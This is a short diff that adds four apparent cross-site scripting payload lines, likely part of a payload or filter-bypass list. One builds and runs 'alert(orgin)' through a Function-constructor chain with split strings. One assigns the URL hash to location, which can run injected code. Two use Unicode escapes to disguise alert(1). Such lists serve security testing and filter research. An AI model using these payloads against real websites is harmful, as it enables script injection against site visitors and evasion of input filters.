@@ -1,0 +1,5 @@
+[] ['cons' +'tructor']['cons' +'tructor']('aler' +'t(orgin)')()
+location=location.hash.split('#')[1]
+\u{0061}lert(1)
+\u{000000000000000061}lert(1)
+
